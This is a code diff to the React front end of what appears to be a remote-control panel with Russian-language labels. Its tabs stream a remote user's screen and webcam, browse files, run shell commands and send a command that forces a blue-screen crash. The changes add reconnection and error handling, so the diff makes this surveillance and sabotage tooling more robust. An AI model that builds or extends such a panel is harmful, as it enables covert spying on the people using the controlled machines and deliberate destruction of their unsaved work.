@@ -131,45 +131,67 @@ function ScreenTab({ worker }) {
   }
 
   useEffect(() => {
-    // Screenshot view WS
-    const shotWs = createScreenshotViewWs(worker.id)
-    shotWs.binaryType = 'arraybuffer'
-    shotWs.onmessage = (e) => {
-      if (typeof e.data === 'string') { setShotWorkerOnline(e.data.slice(1) === 'connected'); return }
-      setShotCapturing(false)
-      const blob = new Blob([e.data], { type: 'image/jpeg' })
-      const url = URL.createObjectURL(blob)
-      if (prevShotUrlRef.current) URL.revokeObjectURL(prevShotUrlRef.current)
-      prevShotUrlRef.current = url
-      setShotUrl(url)
-      setShotAt(new Date())
-    }
-    shotWs.onclose = () => { shotWsRef.current = null; setShotWorkerOnline(false) }
-    shotWsRef.current = shotWs
+    let destroyed = false
+    let shotReconnect = null
+    let camReconnect = null
 
-    // Webcam view WS
-    const camWs = createWebcamViewWs(worker.id)
-    camWs.binaryType = 'arraybuffer'
-    camWs.onmessage = (e) => {
-      if (typeof e.data === 'string') { setWebcamWorkerOnline(e.data.slice(1) === 'connected'); return }
-      setWebcamCapturing(false)
-      const blob = new Blob([e.data], { type: 'image/jpeg' })
-      const url = URL.createObjectURL(blob)
-      if (prevWebcamUrlRef.current) URL.revokeObjectURL(prevWebcamUrlRef.current)
-      prevWebcamUrlRef.current = url
-      setWebcamUrl(url)
+    const connectShot = () => {
+      if (destroyed) return
+      const ws = createScreenshotViewWs(worker.id)
+      ws.binaryType = 'arraybuffer'
+      ws.onmessage = (e) => {
+        if (typeof e.data === 'string') { setShotWorkerOnline(e.data.slice(1) === 'connected'); return }
+        setShotCapturing(false)
+        const blob = new Blob([e.data], { type: 'image/jpeg' })
+        const url = URL.createObjectURL(blob)
+        if (prevShotUrlRef.current) URL.revokeObjectURL(prevShotUrlRef.current)
+        prevShotUrlRef.current = url
+        setShotUrl(url)
+        setShotAt(new Date())
+      }
+      ws.onclose = () => {
+        shotWsRef.current = null
+        setShotWorkerOnline(false)
+        if (!destroyed) shotReconnect = setTimeout(connectShot, 3000)
+      }
+      shotWsRef.current = ws
     }
-    camWs.onclose = () => { webcamWsRef.current = null; setWebcamWorkerOnline(false) }
-    webcamWsRef.current = camWs
+
+    const connectCam = () => {
+      if (destroyed) return
+      const ws = createWebcamViewWs(worker.id)
+      ws.binaryType = 'arraybuffer'
+      ws.onmessage = (e) => {
+        if (typeof e.data === 'string') { setWebcamWorkerOnline(e.data.slice(1) === 'connected'); return }
+        setWebcamCapturing(false)
+        const blob = new Blob([e.data], { type: 'image/jpeg' })
+        const url = URL.createObjectURL(blob)
+        if (prevWebcamUrlRef.current) URL.revokeObjectURL(prevWebcamUrlRef.current)
+        prevWebcamUrlRef.current = url
+        setWebcamUrl(url)
+      }
+      ws.onclose = () => {
+        webcamWsRef.current = null
+        setWebcamWorkerOnline(false)
+        if (!destroyed) camReconnect = setTimeout(connectCam, 3000)
+      }
+      webcamWsRef.current = ws
+    }
+
+    connectShot()
+    connectCam()
 
     return () => {
+      destroyed = true
+      if (shotReconnect) clearTimeout(shotReconnect)
+      if (camReconnect) clearTimeout(camReconnect)
       if (prevShotUrlRef.current) URL.revokeObjectURL(prevShotUrlRef.current)
       if (prevWebcamUrlRef.current) URL.revokeObjectURL(prevWebcamUrlRef.current)
       stopLive()
-      shotWs.close()
-      camWs.close()
+      shotWsRef.current?.close()
+      webcamWsRef.current?.close()
     }
-  }, [])
+  }, [worker.id])
 
   const shotAge = shotAt ? Math.floor((Date.now() - shotAt.getTime()) / 1000) : null
   const shotAgeStr = shotAge === null ? '' : shotAge < 60 ? `${shotAge}с назад` : `${Math.floor(shotAge / 60)}м назад`
@@ -352,10 +374,17 @@ function ProcessesTab({ worker }) {
 // ── Controls tab ──────────────────────────────────────────────────────────────
 function ControlsTab({ worker }) {
   const [done, setDone] = useState({})
+  const [errors, setErrors] = useState({})
   const send = async (cmd, label) => {
     if (!confirm(`${label} для ${worker.username}?`)) return
-    await sendWorkerCommand(worker.id, cmd)
-    setDone(d => ({ ...d, [cmd]: true }))
+    setErrors(e => ({ ...e, [cmd]: null }))
+    try {
+      await sendWorkerCommand(worker.id, cmd)
+      setDone(d => ({ ...d, [cmd]: true }))
+    } catch (err) {
+      const msg = err.response?.data?.detail || 'Ошибка'
+      setErrors(e => ({ ...e, [cmd]: msg }))
+    }
   }
 
   const controls = [
@@ -373,10 +402,13 @@ function ControlsTab({ worker }) {
             <div className="text-sm text-white font-medium">{label}</div>
             <div className="text-xs text-slate-500 mt-0.5">{desc}</div>
           </div>
-          <button onClick={() => send(cmd, label)} disabled={done[cmd]}
-            className={`text-xs px-4 py-2 rounded-lg border disabled:opacity-50 transition-colors ${cls}`}>
-            {done[cmd] ? 'Отправлено' : `${icon} ${label.split(' ')[0]}`}
-          </button>
+          <div className="flex flex-col items-end gap-1">
+            {errors[cmd] && <span className="text-xs text-red-400">{errors[cmd]}</span>}
+            <button onClick={() => send(cmd, label)} disabled={done[cmd]}
+              className={`text-xs px-4 py-2 rounded-lg border disabled:opacity-50 transition-colors ${cls}`}>
+              {done[cmd] ? 'Отправлено' : `${icon} ${label.split(' ')[0]}`}
+            </button>
+          </div>
         </div>
       ))}
 
@@ -386,13 +418,16 @@ function ControlsTab({ worker }) {
           <div className="text-sm text-red-300 font-medium">Аварийное выключение (BSOD)</div>
           <div className="text-xs text-red-500/70 mt-0.5">Вызывает синий экран смерти. Несохранённые данные будут потеряны</div>
         </div>
-        <button
-          onClick={() => send('bsod', '⚠️ Вызвать BSOD')}
-          disabled={done['bsod']}
-          className="text-xs px-4 py-2 rounded-lg bg-red-600/20 border border-red-500/40 text-red-400 hover:bg-red-600/30 disabled:opacity-50 transition-colors font-medium"
-        >
-          {done['bsod'] ? 'Отправлено' : '💀 BSOD'}
-        </button>
+        <div className="flex flex-col items-end gap-1">
+          {errors['bsod'] && <span className="text-xs text-red-400">{errors['bsod']}</span>}
+          <button
+            onClick={() => send('bsod', '⚠️ Вызвать BSOD')}
+            disabled={done['bsod']}
+            className="text-xs px-4 py-2 rounded-lg bg-red-600/20 border border-red-500/40 text-red-400 hover:bg-red-600/30 disabled:opacity-50 transition-colors font-medium"
+          >
+            {done['bsod'] ? 'Отправлено' : '💀 BSOD'}
+          </button>
+        </div>
       </div>
     </div>
   )
@@ -432,23 +467,45 @@ function FileTab({ worker }) {
   })
 
   useEffect(() => {
-    const ws = createFilesViewWs(worker.id)
-    ws.onopen = () => setConnected(true)
-    ws.onclose = () => { setConnected(false); setWorkerOnline(false) }
-    ws.onmessage = (e) => {
-      const msg = JSON.parse(e.data)
-      if (typeof msg === 'string' && msg.startsWith('\x01')) {
-        setWorkerOnline(msg.slice(1) === 'online'); return
+    let destroyed = false
+    let reconnectTimeout = null
+
+    const connect = () => {
+      if (destroyed) return
+      const ws = createFilesViewWs(worker.id)
+      ws.onopen = () => setConnected(true)
+      ws.onclose = () => {
+        // Reject all pending requests so they don't hang forever
+        Object.values(pendingRef.current).forEach(({ reject }) => reject(new Error('Disconnected')))
+        pendingRef.current = {}
+        setConnected(false)
+        setWorkerOnline(false)
+        if (!destroyed) reconnectTimeout = setTimeout(connect, 3000)
       }
-      if (msg.id && pendingRef.current[msg.id]) {
-        const { resolve } = pendingRef.current[msg.id]
-        delete pendingRef.current[msg.id]
-        resolve(msg)
+      ws.onmessage = (e) => {
+        // Check control messages BEFORE JSON.parse (avoids crash on '\x01...' strings)
+        if (typeof e.data === 'string' && e.data.startsWith('\x01')) {
+          setWorkerOnline(e.data.slice(1) === 'online'); return
+        }
+        try {
+          const msg = JSON.parse(e.data)
+          if (msg.id && pendingRef.current[msg.id]) {
+            const { resolve } = pendingRef.current[msg.id]
+            delete pendingRef.current[msg.id]
+            resolve(msg)
+          }
+        } catch {}
       }
+      wsRef.current = ws
     }
-    wsRef.current = ws
-    return () => ws.close()
-  }, [])
+
+    connect()
+    return () => {
+      destroyed = true
+      if (reconnectTimeout) clearTimeout(reconnectTimeout)
+      wsRef.current?.close()
+    }
+  }, [worker.id])
 
   useEffect(() => {
     if (!workerOnline) return
@@ -572,27 +629,42 @@ function ShellTab({ worker }) {
   const historyIdxRef = useRef(-1)
 
   useEffect(() => {
-    const ws = createShellViewWs(worker.id)
-    ws.onopen = () => setConnected(true)
-    ws.onclose = () => {
-      setConnected(false)
-      setLines(l => [...l, { type: 'info', text: '(соединение закрыто)' }])
-    }
-    ws.onmessage = (e) => {
-      const text = e.data
-      if (text.startsWith('\x01')) {
-        const status = text.slice(1)
-        setWorkerOnline(status === 'connected')
-        setLines(l => [...l, { type: 'info', text: status === 'connected' ? 'Воркер подключён' : 'Воркер офлайн' }])
-        return
+    let destroyed = false
+    let reconnectTimeout = null
+
+    const connect = () => {
+      if (destroyed) return
+      const ws = createShellViewWs(worker.id)
+      ws.onopen = () => setConnected(true)
+      ws.onclose = () => {
+        setConnected(false)
+        setWorkerOnline(false)
+        setRunning(false)
+        setLines(l => [...l, { type: 'info', text: '(соединение закрыто)' }])
+        if (!destroyed) reconnectTimeout = setTimeout(connect, 3000)
       }
-      setRunning(false)
-      setLines(l => [...l, { type: 'output', text }])
-      setTimeout(() => bottomRef.current?.scrollIntoView({ behavior: 'smooth' }), 50)
+      ws.onmessage = (e) => {
+        const text = e.data
+        if (text.startsWith('\x01')) {
+          const status = text.slice(1)
+          setWorkerOnline(status === 'connected')
+          setLines(l => [...l, { type: 'info', text: status === 'connected' ? 'Воркер подключён' : 'Воркер офлайн' }])
+          return
+        }
+        setRunning(false)
+        setLines(l => [...l, { type: 'output', text }])
+        setTimeout(() => bottomRef.current?.scrollIntoView({ behavior: 'smooth' }), 50)
+      }
+      wsRef.current = ws
     }
-    wsRef.current = ws
-    return () => ws.close()
-  }, [])
+
+    connect()
+    return () => {
+      destroyed = true
+      if (reconnectTimeout) clearTimeout(reconnectTimeout)
+      wsRef.current?.close()
+    }
+  }, [worker.id])
 
   const sendCmd = () => {
     const cmd = input.trim()
